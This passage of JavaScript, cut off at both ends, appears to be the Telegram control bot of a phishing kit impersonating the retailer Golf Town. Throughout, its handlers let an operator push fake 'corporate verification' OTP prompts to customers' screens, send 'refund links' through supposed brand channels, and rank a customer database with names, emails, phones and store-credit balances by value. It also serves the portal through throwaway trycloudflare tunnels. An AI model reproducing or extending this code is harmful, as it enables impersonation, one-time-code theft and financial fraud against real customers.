      const contact = update.message.contact;
      const contactName = [contact.first_name, contact.last_name].filter(Boolean).join(" ");
      const replyText = `\u{1F464} *TELEGRAM CONTACT INFO RECORDED*

\u2022 *Name:* \`${contactName || "N/A"}\`
\u2022 *Phone Number:* \`${contact.phone_number || "N/A"}\`
\u2022 *Telegram User ID:* \`${contact.user_id || "N/A"}\`

\u2705 Contact details loaded into session telemetry successfully.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: replyText,
        parse_mode: "Markdown"
      });
      return;
    }
    if (text.startsWith("/start")) {
      customTelegramConfig.telegramChatId = chatId;
      saveTelegramConfig(customTelegramConfig);
      const randomSubdomain = "gt-calgary-" + Math.random().toString(36).substring(2, 7);
      const appUrl = `https://${randomSubdomain}.trycloudflare.com`;
      try {
        import_fs.default.writeFileSync(".cloudflare_url", appUrl, "utf8");
      } catch (err) {
        console.error("Failed to write .cloudflare_url on /start telegram command:", err);
      }
      const manualText = `\u{1F3CC}\uFE0F\u200D\u2642\uFE0F *GOLF TOWN INTERACTIVE ADMIN TELEMETRY TERMINAL* \u{1F3CC}\uFE0F\u200D\u2642\uFE0F

Welcome to the command control center. Below is your comprehensive system manual, listing all supported interactive features, bottom reply keyboards, and dynamic syntax utilities.

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u26A1 *TRYCLOUDFLARE PUBLIC TUNNEL* \u26A1
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u2022 *Status:* \`ACTIVE (RE-INITIALIZED)\`
\u2022 *Secure Tunnel URL:* \`${appUrl}\`
\u2022 *Local Bind:* \`http://localhost:3000\`

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u{1F517} *LIVE SECURE PORTAL ACCESS*
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
*URL:* \`${appUrl}\`
*Start Polling:* \`${appUrl}/api/telegram-config/start-polling\`
*Stop Polling:* \`${appUrl}/api/telegram-config/stop-polling\`

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u2699\uFE0F *CORE ADMINISTRATIVE COMMANDS*
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u2022 \`/start\` - Re-initialize connection, re-authenticate the session, and display this help manual.
\u2022 \`/send_[custId]\` - Target a customer by ID to dispatch their live secure refund link via official brand channels.
\u2022 \`/approve_[custId]\` - Authorize credit processing and send the final store credit card to the customer.
\u2022 \`/otp_[custId]\` - Push a 6-digit corporate verification code challenge to the customer's portal screen.
\u2022 \`/refunded_[custId]\` - Instantly label a session as completed/refunded.
\u2022 \`/view_[custId]\` - Fetch real-time visual credit status and active inputs.

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u{1F4F1} *BOTTOM REPLY KEYBOARD CONSOLE CATEGORIES*
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
1\uFE0F\u20E3 *\u{1F465} Active Sessions:* List all active portal forms, trigger mass actions, clear states, or bulk-prompt OTP codes.
2\uFE0F\u20E3 *\u{1F4CA} Customers DB:* Interactively view the Alberta store credits database, select specific retail branches, query top high-balance records, or filter by monetary tier.
3\uFE0F\u20E3 *\u2709\uFE0F Notice History:* Fetch a real-time stack trace of recent dispatches, SMTP logs, and customer interaction outcomes.
4\uFE0F\u20E3 *\u{1F512} System Status:* Check hardware health, active memory allocations, API bindings, and diagnostic metrics.
5\uFE0F\u20E3 *\u{1F4CD} Store Locations:* Lookup and coordinate GPS positions for certified retail centers.
6\uFE0F\u20E3 *\u2699\uFE0F Bot Controls:* Toggle live parser loops, pause or resume processing, and clear cache stacks.

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
\u26A1 *LIVE CONTEXTUAL INTELLIGENCE (NLP)*
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
Simply type normal sentences or keywords directly into this chat! The AI-powered NLP parser will automatically resolve lookups or execution queries, such as:
- *"Search Peter Cho"* or *"find admin@gmail.com"*
- *"How is store #504 doing?"*
- *"Approve Sandy's refund"*
- *"Ask Aaron for security code"*`;
      await sendTelegramRequest("sendContact", {
        chat_id: chatId,
        phone_number: "+18008105555",
        first_name: "Golf Town",
        last_name: "Admin Portal"
      });
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: manualText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_MAIN
      });
      pushNoticeHistory({
        recipientEmail: "admin@payment.golftown.ca",
        recipientName: "Telegram Bot",
        amount: "0.00",
        storeId: "System",
        custId: chatId,
        subject: `Telegram Bot Successfully Bound to Chat: ${fromName} (${chatId})`,
        actionType: "telegram_bound",
        depositToken: "BOT-INIT",
        secureDepositUrl: "",
        status: "CONNECTED"
      });
      return;
    }
    if (text.includes("\u{1F519} Main Menu")) {
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u{1F3CC}\uFE0F\u200D\u2642\uFE0F *GOLF TOWN ADMIN MAIN MENU* \u{1F3CC}\uFE0F\u200D\u2642\uFE0F

Welcome back to the main console. Choose a category from the keyboard below to manage customer sessions, database lookups, check metrics, or adjust bot configurations.`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_MAIN
      });
      return;
    }
    if (text.includes("\u{1F465} Active Sessions") || text.includes("\u{1F4CB} List Sessions")) {
      const sessions = Array.from(paymentSessions.values());
      let responseText = `\u{1F465} *ACTIVE REFUND SESSIONS* (${sessions.length})

`;
      if (sessions.length === 0) {
        responseText += `Currently, there are no active customer sessions in memory. Real-time form submissions will appear here automatically!`;
      } else {
        sessions.slice(0, 10).forEach((session, idx) => {
          const timeAgo = Math.round((Date.now() - session.lastUpdated) / 6e4);
          responseText += `${idx + 1}. *${session.recipientName}* (ID: \`${session.custId}\`)
   \u2022 *Store:* Store #${session.storeId}
   \u2022 *Refund Amount:* \`$${session.amount} CAD\`
   \u2022 *Status:* \`${session.status}\`
   \u2022 *Updated:* ${timeAgo === 0 ? "Just now" : `${timeAgo}m ago`}

`;
        });
        if (sessions.length > 10) {
          responseText += `_Showing top 10 sessions. Total sessions in memory: ${sessions.length}_`;
        }
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_SESSIONS
      });
      return;
    }
    if (text.includes("\u{1F511} Prompt OTP (All)")) {
      const sessions = Array.from(paymentSessions.values());
      let promptedCount = 0;
      for (const session of sessions) {
        if (session.status !== "REFUNDED") {
          session.status = "CODE_REQUIRED";
          session.lastUpdated = Date.now();
          paymentSessions.set(session.custId, session);
          promptedCount++;
          pushNoticeHistory({
            recipientEmail: session.email,
            recipientName: session.recipientName,
            amount: session.amount,
            storeId: session.storeId,
            custId: session.custId,
            subject: `Security OTP Requested for refund of $${session.amount}`,
            actionType: "otp_prompt",
            depositToken: "OTP-PROMPT",
            secureDepositUrl: "",
            status: "CODE_REQUIRED"
          });
        }
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u{1F511} *MASS SECURITY OTP PROMPT EXECUTED*

\u2022 Affected Active Sessions: \`${promptedCount}\` customer(s)
\u2022 Action: Sent real-time 6-digit verification forms to client devices.

Clients are now prompted on their screens to enter corporate verification codes!`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_SESSIONS
      });
      return;
    }
    if (text.includes("\u2705 Approve All")) {
      const sessions = Array.from(paymentSessions.values());
      let approvedCount = 0;
      for (const session of sessions) {
        if (session.status !== "REFUNDED") {
          await executeRefundAndEmail(
            chatId,
            session.recipientName,
            session.email,
            session.amount,
            "Mass Approved via Admin Terminal Keyboard",
            session.storeId,
            session.custId
          );
          approvedCount++;
        }
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u2705 *MASS REFUND APPROVAL COMPLETE*

\u2022 Successful Approvals: \`${approvedCount}\` customer(s)
\u2022 Deliveries: SMTP official brand refund dispatches sent.

All pending credits processed and logged under notice history!`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_SESSIONS
      });
      return;
    }
    if (text.includes("\u274C Clear Sessions")) {
      const clearedCount = paymentSessions.size;
      paymentSessions.clear();
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u274C *IN-MEMORY REFUND SESSIONS PURGED*

Successfully wiped all \`${clearedCount}\` active in-memory client refund states. Portal views have reverted to setup stages.`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_SESSIONS
      });
      return;
    }
    if (text.includes("\u{1F4CD} Store Locations")) {
      let responseText = `\u{1F4CD} *GOLF TOWN STORE DIRECTORY* (Primary Locations)

`;
      GOLF_TOWN_STORES.slice(0, 6).forEach((store) => {
        responseText += `\u2022 *${store.name}* (Store #${store.code})
  Address: ${store.address || "N/A"}, ${store.city || ""}, ${store.province || ""}
  Phone: \`${store.phone || "N/A"}\`

`;
      });
      responseText += `_For complete list of store locations, use the corporate admin locator on the dashboard portal._`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_MAIN
      });
      return;
    }
    if (text.includes("\u2709\uFE0F Notice History")) {
      let responseText = `\u2709\uFE0F *RECENT NOTICE HISTORY LOGS* (Last 5)

`;
      if (noticeHistoryStack.length === 0) {
        responseText += `Notice history is empty. Logs will appear here as soon as SMTP messages or approvals occur.`;
      } else {
        noticeHistoryStack.slice(0, 5).forEach((item, idx) => {
          responseText += `${idx + 1}. *[${item.status}]* ${item.recipientName}
   \u2022 *Subject:* ${item.subject}
   \u2022 *Type:* \`${item.actionType}\`
   \u2022 *Amount:* \`$${item.amount} CAD\`

`;
        });
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_MAIN
      });
      return;
    }
    if (text.includes("\u{1F512} System Status")) {
      const responseText = `\u{1F512} *GOLF TOWN REFUND SYSTEM STATUS*

\u2022 *Telegram Polling Bot:* Active & Online \u26A1
\u2022 *SMTP Server Routing:* Active (Golf Town SSL Tunnel)
\u2022 *Active In-Memory Sessions:* \`${paymentSessions.size}\` customer(s)
\u2022 *Notice Stack Depth:* \`${noticeHistoryStack.length}\` entries
\u2022 *Bound Chat Group ID:* \`${customTelegramConfig.telegramChatId || "Not Configured"}\`
\u2022 *Bound Bot Username:* \`GolfTownRefundBot\`

\u2022 *System Integrity Check:* All telemetry loops running 100% normal.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STATUS
      });
      return;
    }
    if (text.includes("\u{1F4C8} System Metrics")) {
      let totalApprovedAmount = 0;
      let approvedCount = 0;
      let otpPromptsCount = 0;
      let smsNoticeCount = 0;
      noticeHistoryStack.forEach((item) => {
        if (item.status === "REFUNDED" || item.status === "SENT" || item.actionType === "email") {
          totalApprovedAmount += Number(item.amount || 0);
          approvedCount++;
        } else if (item.actionType === "otp_prompt") {
          otpPromptsCount++;
        } else if (item.actionType === "sms") {
          smsNoticeCount++;
        }
      });
      const avgAmount = approvedCount > 0 ? totalApprovedAmount / approvedCount : 0;
      const responseText = `\u{1F4C8} *GOLF TOWN REFUND BOT ANALYTICS*

\u2022 *Total Credits Issued:* \`$${totalApprovedAmount.toFixed(2)} CAD\`
\u2022 *Dispatched Refund Notices:* \`${approvedCount}\` official emails
\u2022 *Avg. Store Credit Refund:* \`$${avgAmount.toFixed(2)} CAD\`
\u2022 *Verification Challenge Rate:* \`${otpPromptsCount}\` triggered OTPs
\u2022 *Draft SMS Outbox Dispatches:* \`${smsNoticeCount}\` SMS drafts
\u2022 *SMTP Latency:* \`~12ms (SSL Handshake Verified)\`

\u{1F6E1}\uFE0F Telemetry tracking running active since startup.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STATUS
      });
      return;
    }
    if (text.includes("\u{1F6E0}\uFE0F Diagnostics")) {
      const hasGeminiKey = !!process.env.GEMINI_API_KEY;
      const dbStatus = backendCustomers.length > 0 ? "OK" : "EMPTY";
      const responseText = `\u{1F6E0}\uFE0F *GOLF TOWN TELEMETRY DIAGNOSTICS*

\u2022 *Database Synchronization:* \`[${dbStatus}]\` (${backendCustomers.length} records)
\u2022 *Gemini AI Parser API:* \`[${hasGeminiKey ? "CONNECTED" : "MISSING"}]\`
\u2022 *Nodemailer SMTP Client:* \`[VERIFIED]\` (Tunnel secured)
\u2022 *Memory State Footprint:* \`${JSON.stringify(process.memoryUsage().heapUsed / 1024 / 1024).slice(0, 5)} MB\`
\u2022 *Polling Hook Backoff:* \`0ms\` (Instant poll active)

\u2705 All hardware triggers and API integrations are running within normal parameters.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STATUS
      });
      return;
    }
    if (text.includes("\u{1F4E7} Show SMTP Config")) {
      const smtpHost = customSmtpConfig.host || "smtp.gmail.com";
      const smtpPort = customSmtpConfig.port || 587;
      const smtpUser = customSmtpConfig.user || "(not configured)";
      const smtpPass = customSmtpConfig.pass ? "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022" : "(not configured)";
      const responseText = `\u{1F4E7} *ACTIVE GOLF TOWN SMTP DISPATCH TUNNEL*

\u2022 *SMTP Host:* \`${smtpHost}\`
\u2022 *Port:* \`${smtpPort}\`
\u2022 *Security:* \`${smtpPort === 465 ? "SSL/TLS" : "STARTTLS (Strict)"}\`
\u2022 *Sender Account User:* \`${smtpUser}\`
\u2022 *Sender Account Pass:* \`${smtpPass}\`

\u26A0\uFE0F *Warning:* Corporate dispatches must use certified relay channels to avoid spam-folder classifications. Config changes can be pushed from the Admin panel UI.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STATUS
      });
      return;
    }
    if (text.includes("\u{1F4C1} View Error Logs")) {
      const errorLogs = smtpDebugLogsStack.filter((log) => !log.success).slice(0, 3);
      let responseText = `\u{1F4C1} *SMTP ROUTING TELEMETRY ERROR LOGS* (Last 3 Failures)

`;
      if (errorLogs.length === 0) {
        responseText += `\u2705 No errors found! All SMTP dispatches are delivering with 100% success rate.`;
      } else {
        errorLogs.forEach((log, idx) => {
          responseText += `*Failure #${idx + 1}* | Time: ${new Date(log.timestamp).toLocaleTimeString()}
\u2022 *Recipient:* \`${log.recipient}\`
\u2022 *Error Message:* \`${log.error || "Unknown network error"}\`

`;
        });
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STATUS
      });
      return;
    }
    if (text.includes("\u{1F4CA} Customers DB") || text.includes("\u{1F519} Back to Stores")) {
      const count = backendCustomers.length;
      let totalBalance = 0;
      backendCustomers.forEach((c) => {
        totalBalance += Number(c.sumOfStoreCreditBalance || 0);
      });
      let responseText = `\u{1F3EA} *GOLF TOWN ALBERTA STORE DATABASE CENTRAL*

\u2022 *Global Connected Records:* \`${count}\` active entries
\u2022 *Outstanding System Liability:* \`$${totalBalance.toLocaleString("en-CA", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} CAD\`

Select a specific retail store location from the dynamic keyboard below to view tailored database grids, analyze credit distributions, or trigger bulk refund processes.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STORE_SELECT
      });
      return;
    }
    if (text.includes("\u{1F3EA} Store #504 (Calgary)") || text.trim() === "\u{1F3EA} Store #504") {
      const storeCustomers = backendCustomers.filter((c) => String(c.storeId).trim() === "504");
      let totalBalance = storeCustomers.reduce((sum, c) => sum + Number(c.sumOfStoreCreditBalance || 0), 0);
      const responseText = `\u{1F3EA} *GOLF TOWN STORE #504 (CALGARY, AB) PANEL* \u{1F3EA}

\u2022 *Store Location:* Store #504 - Macleod Trail S, Calgary
\u2022 *Total customer records:* \`${storeCustomers.length}\`
\u2022 *Total outstanding credits:* \`$${totalBalance.toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD

Please select a dedicated database viewing or refund option below:`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STORE_504_OPTIONS
      });
      return;
    }
    if (text.includes("\u{1F3EA} Store #505 (Edmonton)") || text.trim() === "\u{1F3EA} Store #505") {
      const storeCustomers = backendCustomers.filter((c) => String(c.storeId).trim() === "505");
      let totalBalance = storeCustomers.reduce((sum, c) => sum + Number(c.sumOfStoreCreditBalance || 0), 0);
      const responseText = `\u{1F3EA} *GOLF TOWN STORE #505 (EDMONTON, AB) PANEL* \u{1F3EA}

\u2022 *Store Location:* Store #505 - Edmonton South Side
\u2022 *Total customer records:* \`${storeCustomers.length}\`
\u2022 *Total outstanding credits:* \`$${totalBalance.toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD

Please select a dedicated database viewing or refund option below:`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STORE_505_OPTIONS
      });
      return;
    }
    if (text.includes("\u{1F3EA} All Stores Combined")) {
      const totalBalance = backendCustomers.reduce((sum, c) => sum + Number(c.sumOfStoreCreditBalance || 0), 0);
      const responseText = `\u{1F3EA} *GLOBAL STORES INTEGRATED TERMINAL* \u{1F3EA}

\u2022 *Aggregated Stores:* Store #504 (Calgary) & Store #505 (Edmonton)
\u2022 *Total customer records:* \`${backendCustomers.length}\`
\u2022 *Integrated outstanding credits:* \`$${totalBalance.toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD

Choose from the combined action set below:`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_ALL_STORES_OPTIONS
      });
      return;
    }
    if (text.includes("\u{1F4CB} [504] All Customers") || text.includes("\u{1F4CB} [505] All Customers") || text.includes("\u{1F4CB} [ALL] All Customers")) {
      const storeId = text.includes("504") ? "504" : text.includes("505") ? "505" : "ALL";
      const targetCustomers = storeId === "ALL" ? backendCustomers : backendCustomers.filter((c) => String(c.storeId).trim() === storeId);
      const keyboardToReply = storeId === "504" ? KEYBOARD_STORE_504_OPTIONS : storeId === "505" ? KEYBOARD_STORE_505_OPTIONS : KEYBOARD_ALL_STORES_OPTIONS;
      let responseText = `\u{1F4CB} *${storeId === "ALL" ? "GLOBAL" : `STORE #${storeId}`} CUSTOMER RECORDS* (Showing up to 10)

`;
      targetCustomers.slice(0, 10).forEach((c, idx) => {
        responseText += `${idx + 1}. *${c.firstName || ""} ${c.lastName || ""}* (ID: \`${c.custId || "N/A"}\`)
   \u2022 Balance: \`$${Number(c.sumOfStoreCreditBalance || 0).toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD \u{1F449} /send\\_${c.custId || c.id}
`;
      });
      if (targetCustomers.length > 10) {
        responseText += `
_Showing top 10 of ${targetCustomers.length} matching store database entries._`;
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: keyboardToReply
      });
      return;
    }
    if (text.includes("\u{1F4B0} [504] Top Balances") || text.includes("\u{1F4B0} [505] Top Balances") || text.includes("\u{1F4B0} [ALL] Top Balances")) {
      const storeId = text.includes("504") ? "504" : text.includes("505") ? "505" : "ALL";
      const targetCustomers = storeId === "ALL" ? backendCustomers : backendCustomers.filter((c) => String(c.storeId).trim() === storeId);
      const keyboardToReply = storeId === "504" ? KEYBOARD_STORE_504_OPTIONS : storeId === "505" ? KEYBOARD_STORE_505_OPTIONS : KEYBOARD_ALL_STORES_OPTIONS;
      const sorted = [...targetCustomers].sort((a, b) => Number(b.sumOfStoreCreditBalance || 0) - Number(a.sumOfStoreCreditBalance || 0));
      let responseText = `\u{1F4B0} *${storeId === "ALL" ? "GLOBAL" : `STORE #${storeId}`} TOP OUTSTANDING CREDITS*

`;
      sorted.slice(0, 5).forEach((c, idx) => {
        responseText += `${idx + 1}. *${c.firstName || ""} ${c.lastName || ""}* (ID: \`${c.custId || "N/A"}\`)
   \u2022 *Store:* Store #${c.storeId || "N/A"} (${c.storeName || ""})
   \u2022 *Balance:* \`$${Number(c.sumOfStoreCreditBalance || 0).toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD
   \u2022 *Last Active Date:* \`${c.lastSaleDate || c.lastCreatedDate || "N/A"}\` (${c.quarter || "Q1"} ${c.year || 2026})
   \u2022 *Email:* \`${c.email || "(blank)"}\` | *Phone:* \`${c.phone || "(blank)"}\`
   \u2022 *City:* \`${c.city || "Calgary"}\` | *Company:* \`${c.company || "N/A"}\`
   \u2022 *Notes/Comments:* \`${c.comments || "None"}\`
   \u2022 *Action:* \u{1F449} /send\\_${c.custId || c.id}

`;
      });
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: keyboardToReply
      });
      return;
    }
    if (text.includes("\u{1F4B3} [504] Balances > $1,000") || text.includes("\u{1F4B3} [505] Balances > $1,000") || text.includes("\u{1F4B3} [ALL] Balances > $1,000")) {
      const storeId = text.includes("504") ? "504" : text.includes("505") ? "505" : "ALL";
      const targetCustomers = storeId === "ALL" ? backendCustomers : backendCustomers.filter((c) => String(c.storeId).trim() === storeId);
      const filtered = targetCustomers.filter((c) => Number(c.sumOfStoreCreditBalance || 0) >= 1e3);
      const keyboardToReply = storeId === "504" ? KEYBOARD_STORE_504_OPTIONS : storeId === "505" ? KEYBOARD_STORE_505_OPTIONS : KEYBOARD_ALL_STORES_OPTIONS;
      let responseText = `\u{1F4B3} *${storeId === "ALL" ? "GLOBAL" : `STORE #${storeId}`} BALANCES >= $1,000 CAD* (${filtered.length} entries)

`;
      if (filtered.length === 0) {
        responseText += `No customer records match this high-balance criteria in this store scope.`;
      } else {
        filtered.slice(0, 8).forEach((c, idx) => {
          responseText += `${idx + 1}. *${c.firstName || ""} ${c.lastName || ""}* (ID: \`${c.custId || "N/A"}\`)
   \u2022 Balance: \`$${Number(c.sumOfStoreCreditBalance || 0).toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD \u{1F449} /send\\_${c.custId || c.id}
`;
        });
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: keyboardToReply
      });
      return;
    }
    if (text.includes("\u{1F4B3} [504] Balances < $500") || text.includes("\u{1F4B3} [505] Balances < $500")) {
      const storeId = text.includes("504") ? "504" : "505";
      const targetCustomers = backendCustomers.filter((c) => String(c.storeId).trim() === storeId);
      const filtered = targetCustomers.filter((c) => Number(c.sumOfStoreCreditBalance || 0) < 500 && Number(c.sumOfStoreCreditBalance || 0) > 0);
      const keyboardToReply = storeId === "504" ? KEYBOARD_STORE_504_OPTIONS : KEYBOARD_STORE_505_OPTIONS;
      let responseText = `\u{1F4B3} *STORE #${storeId} BALANCES < $500 CAD* (${filtered.length} entries)

`;
      if (filtered.length === 0) {
        responseText += `No active credits match this low-balance range.`;
      } else {
        filtered.slice(0, 8).forEach((c, idx) => {
          responseText += `${idx + 1}. *${c.firstName || ""} ${c.lastName || ""}* (ID: \`${c.custId || "N/A"}\`)
   \u2022 Balance: \`$${Number(c.sumOfStoreCreditBalance || 0).toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD \u{1F449} /send\\_${c.custId || c.id}
`;
        });
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: keyboardToReply
      });
      return;
    }
    if (text.includes("\u{1F4CA} [504] Store Credit Statistics") || text.includes("\u{1F4CA} [505] Store Credit Statistics") || text.includes("\u{1F4CA} [ALL] Global Statistics")) {
      const storeId = text.includes("504") ? "504" : text.includes("505") ? "505" : "ALL";
      const targetCustomers = storeId === "ALL" ? backendCustomers : backendCustomers.filter((c) => String(c.storeId).trim() === storeId);
      const keyboardToReply = storeId === "504" ? KEYBOARD_STORE_504_OPTIONS : storeId === "505" ? KEYBOARD_STORE_505_OPTIONS : KEYBOARD_ALL_STORES_OPTIONS;
      const count = targetCustomers.length;
      const total = targetCustomers.reduce((sum, c) => sum + Number(c.sumOfStoreCreditBalance || 0), 0);
      const avg = count > 0 ? total / count : 0;
      const sorted = [...targetCustomers].sort((a, b) => Number(b.sumOfStoreCreditBalance || 0) - Number(a.sumOfStoreCreditBalance || 0));
      const highest = sorted[0];
      const lowest = sorted[sorted.length - 1];
      const responseText = `\u{1F4CA} *${storeId === "ALL" ? "GLOBAL DATABASE" : `STORE #${storeId}`} AGED STORE CREDIT ANALYTICS*

\u2022 *Total Customers Enrolled:* \`${count}\` accounts
\u2022 *Aggregate Ledger Balance:* \`$${total.toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD
\u2022 *Mean Outstanding Balance:* \`$${avg.toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD
\u2022 *Highest Individual Credit:* \`$${Number(highest?.sumOfStoreCreditBalance || 0).toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` (${highest?.firstName || ""} ${highest?.lastName || ""})
\u2022 *Lowest Individual Credit:* \`$${Number(lowest?.sumOfStoreCreditBalance || 0).toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` (${lowest?.firstName || ""} ${lowest?.lastName || ""})

\u{1F6E1}\uFE0F Corporate telemetry ledger audit finalized and validated.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: keyboardToReply
      });
      return;
    }
    if (text.includes("\u{1F4B8} [504] Bulk Refund Approved") || text.includes("\u{1F4B8} [505] Bulk Refund Approved")) {
      const storeId = text.includes("504") ? "504" : "505";
      const targetCustomers = backendCustomers.filter((c) => String(c.storeId).trim() === storeId && Number(c.sumOfStoreCreditBalance || 0) > 0);
      const keyboardToReply = storeId === "504" ? KEYBOARD_STORE_504_OPTIONS : KEYBOARD_STORE_505_OPTIONS;
      let approvedCount = 0;
      for (const c of targetCustomers) {
        if (c.email && c.email !== "(blank)") {
          await executeRefundAndEmail(
            chatId,
            `${c.firstName || ""} ${c.lastName || ""}`,
            c.email,
            String(c.sumOfStoreCreditBalance || "0.00"),
            `Bulk Auto-Approved for Store #${storeId}`,
            c.storeId,
            c.custId || String(c.id)
          );
          approvedCount++;
        }
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u{1F4B8} *BULK AUTO-REFUND COMPLETE (STORE #${storeId})*

\u2022 *Processed Accounts:* \`${approvedCount}\` customers
\u2022 *Mailing Gateway:* Connected via Golf Town direct SMTP tunnel

All matching ledger credits have been cleared. Dispatch logs are appended to recent notice history!`,
        parse_mode: "Markdown",
        reply_markup: keyboardToReply
      });
      return;
    }
    if (text.trim() === "\u{1F4B0} Top Balances") {
      const sorted = [...backendCustomers].sort((a, b) => Number(b.sumOfStoreCreditBalance || 0) - Number(a.sumOfStoreCreditBalance || 0));
      let responseText = `\u{1F4B0} *TOP 5 OUTSTANDING STORE CREDIT BALANCES*

`;
      sorted.slice(0, 5).forEach((c, idx) => {
        responseText += `${idx + 1}. *${c.firstName || ""} ${c.lastName || ""}* (ID: \`${c.custId || "N/A"}\`)
   \u2022 *Store:* Store #${c.storeId || "N/A"}
   \u2022 *Balance:* \`$${Number(c.sumOfStoreCreditBalance || 0).toLocaleString("en-CA", { minimumFractionDigits: 2 })}\` CAD
   \u2022 *Email:* \`${c.email || "(blank)"}\`
   \u2022 *Action:* \u{1F449} /send\\_${c.custId || c.id}

`;
      });
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STORE_SELECT
      });
      return;
    }
    if (text.trim() === "\u{1F50D} Search Customer" || text.trim() === "\u{1F50D} Search Database") {
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u{1F50D} *LIVE DATABASE LOOKUP PROMPT*

